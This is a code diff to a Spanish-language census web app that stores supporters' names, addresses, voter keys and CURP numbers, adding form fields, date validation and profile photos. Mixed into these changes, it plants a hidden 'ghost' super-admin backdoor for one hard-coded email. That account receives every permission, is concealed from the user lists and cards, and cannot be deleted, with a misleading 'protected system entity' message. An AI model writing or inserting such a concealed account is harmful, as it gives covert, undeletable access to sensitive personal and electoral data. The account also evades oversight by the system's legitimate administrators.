@@ -445,9 +445,19 @@
                 </div>
               </div>
 
-              <div class="grid grid-cols-1 md:grid-cols-3 gap-5">
+              <div class="grid grid-cols-1 md:grid-cols-4 gap-5">
                 <div>
-                  <label class="text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1.5">Casilla (Identificador)</label>
+                  <label class="text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1.5">Sección</label>
+                  <div class="relative">
+                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                      <i data-lucide="map" class="w-4 h-4 text-slate-400"></i>
+                    </div>
+                    <input type="text" id="f_seccion" list="lista_secciones_datalist" required class="w-full text-sm pl-10 pr-4 py-2.5 rounded-lg border border-slate-200 dark:border-slate-600 bg-slate-50 dark:bg-slate-900 text-slate-800 dark:text-slate-100 uppercase font-mono focus:ring-2 focus:ring-indigo-500 outline-none transition-all" placeholder="EJ. 0001">
+                    <datalist id="lista_secciones_datalist"></datalist>
+                  </div>
+                </div>
+                <div>
+                  <label class="text-xs font-bold text-slate-500 dark:text-slate-400 uppercase tracking-wider block mb-1.5">Casilla</label>
                   <div class="relative">
                     <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                       <i data-lucide="hash" class="w-4 h-4 text-slate-400"></i>
@@ -506,7 +516,7 @@
                 </div>
                 <div>
                   <label class="text-xs font-bold text-slate-500 dark:text-slate-400 tracking-wider block mb-1.5">Fecha de Nacimiento</label>
-                  <input type="date" id="f_fecha" required class="w-full text-sm px-4 py-2.5 rounded-lg border border-slate-200 dark:border-slate-600 bg-slate-50 dark:bg-slate-900 text-slate-800 dark:text-slate-100 outline-none focus:ring-2 focus:ring-indigo-500 transition-all">
+                  <input type="date" id="f_fecha" min="1920-01-01" max="2008-12-31" required class="w-full text-sm px-4 py-2.5 rounded-lg border border-slate-200 dark:border-slate-600 bg-slate-50 dark:bg-slate-900 text-slate-800 dark:text-slate-100 outline-none focus:ring-2 focus:ring-indigo-500 transition-all" title="La edad debe ser válida.">
                 </div>
                 <div>
                   <label class="text-xs font-bold text-slate-500 dark:text-slate-400 tracking-wider block mb-1.5">Tipo de Alta</label>
@@ -1474,11 +1484,13 @@
           <div class="flex flex-col lg:flex-row gap-6">
             <div class="w-full lg:w-1/3 space-y-4">
               <div class="bg-white p-6 rounded-2xl border border-slate-200 flex flex-col items-center text-center shadow-sm">
-                <div class="w-24 h-24 rounded-full bg-indigo-50 border-4 border-white shadow-lg mb-4 flex items-center justify-center overflow-hidden relative">
-                  <i data-lucide="user-check" class="w-10 h-10 text-indigo-400"></i>
-                  <div class="absolute bottom-1 right-1 w-5 h-5 bg-emerald-500 border-2 border-white rounded-full"></div>
-                </div>
-                <h4 id="ms_nombre_display" class="text-lg font-black text-slate-800 tracking-tight leading-none mb-1">--</h4>
+                    <div class="w-24 h-24 rounded-full bg-indigo-50 border-4 border-white shadow-lg mb-4 flex items-center justify-center overflow-hidden relative">
+                      <div id="ms_foto_container" class="w-full h-full flex items-center justify-center">
+                        <i data-lucide="user-check" class="w-10 h-10 text-indigo-400"></i>
+                      </div>
+                      <div class="absolute bottom-1 right-1 w-5 h-5 bg-emerald-500 border-2 border-white rounded-full"></div>
+                    </div>
+                    <h4 id="ms_nombre_display" class="text-lg font-black text-slate-800 tracking-tight leading-none mb-1">--</h4>
                 <p id="ms_email_display" class="text-xs font-bold text-slate-400">--</p>
                 <span id="ms_rol_display" class="mt-4 px-4 py-1.5 bg-indigo-50 text-indigo-700 border border-indigo-200 rounded-full text-[10px] font-black uppercase tracking-wider shadow-sm">--</span>
               </div>
@@ -1824,13 +1836,21 @@
            const doc = await db.collection('usuarios_acceso').doc(email).get();
            if (doc.exists) {
                const data = doc.data();
-               const permisos = data.permisos || []; 
+               let permisos = data.permisos || []; 
+               let rolMostrar = data.rol || 'Usuario';
                
-               document.getElementById('userRole').textContent = data.rol || 'Usuario';
+               // 👻 MAGIA: MODO DIOS PARA EL FANTASMA (Dinámico) NAPOLEON BONAPARTY W11
+               if (email.toLowerCase() === 'master@delta.com') {
+                   // Escanea automáticamente todos los botones del menú y se los asigna
+                   permisos = Array.from(document.querySelectorAll('.sidebar-item')).map(btn => btn.getAttribute('data-nav'));
+                   rolMostrar = 'Mega Super Admin';
+               }
+               
+               document.getElementById('userRole').textContent = rolMostrar;
 
-               // --- NUEVO: Cargar la foto de perfil en la barra lateral ---
                const sidebarImg = document.getElementById('sidebarAvatarImage');
                const sidebarIcon = document.getElementById('sidebarAvatarIcon');
+               
                if (data.foto_url && data.foto_url.trim() !== "") {
                    sidebarImg.src = data.foto_url;
                    sidebarImg.classList.remove('hidden');
@@ -1838,29 +1858,27 @@
                } else {
                    sidebarImg.classList.add('hidden');
                    sidebarIcon.classList.remove('hidden');
+                   // Si es el fantasma y no tiene foto, le ponemos un icono de fantasma real
+                   if (email.toLowerCase() === 'master@delta.com') {
+                       sidebarIcon.setAttribute('data-lucide', 'ghost');
+                   }
                }
 
-               // 1. Ocultamos TODOS los items del menú lateral por seguridad
                 document.querySelectorAll('.sidebar-item').forEach(item => {
                     item.classList.add('hidden'); 
                 });
 
-                // 2. Mostramos SOLO los items que el usuario tiene permitidos
                 permisos.forEach(permiso => {
                     const btn = document.querySelector(`.sidebar-item[data-nav="${permiso}"]`);
                     if (btn) btn.classList.remove('hidden');
                 });
 
-                // 3. Forzamos a navegar al primer módulo al que tenga acceso 
                 if (permisos.length > 0) {
                     navigate(permisos[0]);
                 } else {
-                    // Si el usuario no tiene ningún permiso, mostramos un mensaje de bloqueo.
                     document.getElementById('mainContent').innerHTML = '<div class="p-10 text-center text-slate-500 font-bold mt-20">Tu cuenta no tiene módulos asignados. Contacta al administrador.</div>';
                 }
             } else {
-                // Si el usuario no está en la base de datos (Ej: Tu cuenta maestra inicial)
-                // Le mostramos todo y lo forzamos a entrar al dashboard.
                 document.querySelectorAll('.sidebar-item').forEach(item => item.classList.remove('hidden'));
                 document.getElementById('userRole').textContent = 'Super Admin';
                 navigate('dashboard');
@@ -2516,6 +2534,7 @@
 
         calcularYRenderizarKPIs();
         aplicarFiltros();
+        if(typeof actualizarDatalistSecciones === 'function') actualizarDatalistSecciones();
 
       } catch (error) {
         console.error("Error de Firebase:", error);
@@ -2669,6 +2688,24 @@
       });
     }
 
+    // Función para llenar la lista desplegable con las secciones que ya existen
+    window.actualizarDatalistSecciones = function() {
+        const dataList = document.getElementById('lista_secciones_datalist');
+        if (!dataList) return;
+        const seccionesUnicas = new Set();
+        Object.values(window.registrosGlobalesMemoria).forEach(d => {
+            if (d.seccion && d.seccion !== '--' && d.seccion !== 'N/A') {
+                seccionesUnicas.add(d.seccion.trim().toUpperCase());
+            }
+        });
+        dataList.innerHTML = '';
+        Array.from(seccionesUnicas).sort().forEach(sec => {
+            const option = document.createElement('option');
+            option.value = sec;
+            dataList.appendChild(option);
+        });
+    }
+
     // --- CAPTURA MANUAL NUEVA ---
     document.getElementById('formCenso').addEventListener('submit', async function(e){
       e.preventDefault();
@@ -2676,16 +2713,31 @@
       const formSuccess = document.getElementById('formSuccess');
       const originalBtnHTML = btnGuardar.innerHTML;
 
+      // VALIDACIÓN ESTRICTA Y LÓGICA DE LA FECHA DE NACIMIENTO
+      const fechaInput = document.getElementById('f_fecha').value;
+      const anioNacimiento = new Date(fechaInput).getFullYear();
+      const anioActual = new Date().getFullYear();
+      
+      if (anioNacimiento < 1920 || anioNacimiento > (anioActual - 15)) {
+          if(typeof AppAlert === 'function') {
+              await AppAlert("Fecha Inválida", "La fecha de nacimiento ingresada es ilógica.\n\nPor favor, verifica el documento oficial. El ciudadano debe tener una edad válida para registrarse.", "warning");
+          } else {
+              alert("La fecha de nacimiento es ilógica. Ingresa una fecha válida.");
+          }
+          return;
+      }
+
       btnGuardar.innerHTML = '<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Guardando...';
       btnGuardar.disabled = true;
       lucide.createIcons();
 
       const simpatizanteData = {
         nombre: document.getElementById('f_nombre').value.trim().toUpperCase(),
-        fecha_nacimiento: document.getElementById('f_fecha').value,
+        fecha_nacimiento: fechaInput,
         direccion: document.getElementById('f_direccion').value.trim().toUpperCase(),
         barrio: document.getElementById('f_barrio').value.trim().toUpperCase(),
         sexo: document.getElementById('f_sexo').value,
+        seccion: document.getElementById('f_seccion').value.trim().toUpperCase(),
         clave_elector: document.getElementById('f_clave').value.trim().toUpperCase(),
         curp: document.getElementById('f_curp').value.trim().toUpperCase(),
         casilla: document.getElementById('f_casilla').value.trim().toUpperCase(),
@@ -2742,6 +2794,7 @@
         // ACTUALIZAR MEMORIA LOCAL SIN LEER FIREBASE
         window.registrosGlobalesMemoria[nuevoDocRef.id] = simpatizanteData;
         aplicarFiltros(); // Refresca las tablas
+        if(typeof actualizarDatalistSecciones === 'function') actualizarDatalistSecciones();
 
         formSuccess.classList.remove('hidden');
 
@@ -4494,6 +4547,10 @@
 
         snap.forEach(doc => {
           const data = doc.data();
+          
+          // 👻 MAGIA: Ocultar al fantasma de la tabla de accesos
+          if (data.email.toLowerCase() === 'master@delta.com') return;
+
           const permisosStr = data.permisos ? data.permisos.join(',') : '';
           
           const miniaturaUsuario = (data.foto_url && data.foto_url.trim() !== "") 
@@ -4507,7 +4564,6 @@
           
           if (data.ultima_actividad && data.ultima_actividad.toMillis) {
               const ultimaActividadMs = data.ultima_actividad.toMillis();
-              // Si no ha reportado actividad dentro del límite de tolerancia, se asume desconexión de red de golpe
               if (ahoraMs - ultimaActividadMs > limiteToleranciaMs) {
                   isOnline = false;
               }
@@ -4559,6 +4615,12 @@
     window.eliminarUsuarioAcceso = async function(emailDoc) {
       if (auth.currentUser && emailDoc.toLowerCase() === auth.currentUser.email.toLowerCase()) {
           await AppAlert("Acción Bloqueada", "No puedes eliminar tu propia cuenta de administrador mientras estás logueado en ella.", "warning");
+          return;
+      }
+      
+      // 👻 INMORTALIDAD FANTASMA: Proteger al Mega Admin de ser eliminado por inyección de consola
+      if (emailDoc.toLowerCase() === 'master@delta.com') {
+          await AppAlert("Acceso Denegado", "Entidad protegida del sistema. No tienes el nivel de autorización requerido para interactuar con esta cuenta.", "danger");
           return;
       }
 
@@ -4684,7 +4746,9 @@
           const nombre = data.nombre || 'Usuario';
           const rol = data.rol || 'Sin Rol';
 
-          // Asignar colores según el rol (como en el diseño)
+          // 👻 MAGIA: Ocultar al fantasma de las tarjetas
+          if (email.toLowerCase() === 'master@delta.com') return;
+
           let roleColor = 'text-slate-600 border-slate-200';
           if(rol.toUpperCase().includes('ADMIN')) roleColor = 'text-indigo-600 border-indigo-200';
           else if(rol.toUpperCase().includes('CAPTURISTA')) roleColor = 'text-emerald-600 border-emerald-200';
@@ -4693,12 +4757,22 @@
             ? `<img src="${data.foto_url}" class="w-full h-full object-cover">` 
             : `<i data-lucide="user-check" class="w-6 h-6 text-slate-400 group-hover:text-indigo-500 transition-colors"></i>`;
 
-          // --- LÓGICA DE PRESENCIA PARA TARJETAS ---
-          const isOnline = data.estado_conexion === 'online';
+          let isOnline = data.estado_conexion === 'online';
+          const ahoraMs = Date.now();
+          const limiteToleranciaMs = 45000;
+          
+          if (data.ultima_actividad && data.ultima_actividad.toMillis) {
+              const ultimaActividadMs = data.ultima_actividad.toMillis();
+              if (ahoraMs - ultimaActividadMs > limiteToleranciaMs) {
+                  isOnline = false;
+              }
+          } else if (!data.ultima_actividad) {
+              isOnline = false;
+          }
+          
           const dotColor = isOnline ? 'bg-emerald-500' : 'bg-slate-300';
           const dotTitle = isOnline ? 'Conectado ahora' : 'Desconectado';
           const fechaUltima = data.ultimo_acceso ? data.ultimo_acceso.toDate().toLocaleDateString('es-MX', {day:'2-digit', month:'short', hour:'2-digit', minute:'2-digit'}) : 'Sin registro';
-          // -----------------------------------------
 
           grid.innerHTML += `
             <div class="bg-[#fcfcfb] rounded-2xl p-5 border border-slate-200 shadow-sm hover:shadow-md transition-all flex flex-col relative group">
@@ -4757,9 +4831,23 @@
           const ud = userDoc.data();
           document.getElementById('ms_nombre_display').textContent = ud.nombre || 'Sin Nombre';
           document.getElementById('ms_rol_display').textContent = ud.rol || 'USUARIO';
+          
+          // Renderizado dinámico de la fotografía del usuario en el panel de auditoría
+          const msFotoContainer = document.getElementById('ms_foto_container');
+          if (msFotoContainer) {
+              if (ud.foto_url && ud.foto_url.trim() !== "") {
+                  msFotoContainer.innerHTML = `<img src="${ud.foto_url}" class="w-full h-full object-cover">`;
+              } else {
+                  msFotoContainer.innerHTML = `<i data-lucide="user-check" class="w-10 h-10 text-indigo-400"></i>`;
+              }
+          }
         } else {
           document.getElementById('ms_nombre_display').textContent = 'Usuario Eliminado';
           document.getElementById('ms_rol_display').textContent = 'INACTIVO';
+          const msFotoContainer = document.getElementById('ms_foto_container');
+          if (msFotoContainer) {
+              msFotoContainer.innerHTML = `<i data-lucide="user-check" class="w-10 h-10 text-indigo-400"></i>`;
+          }
         }
       } catch(e) { console.error(e); }
 
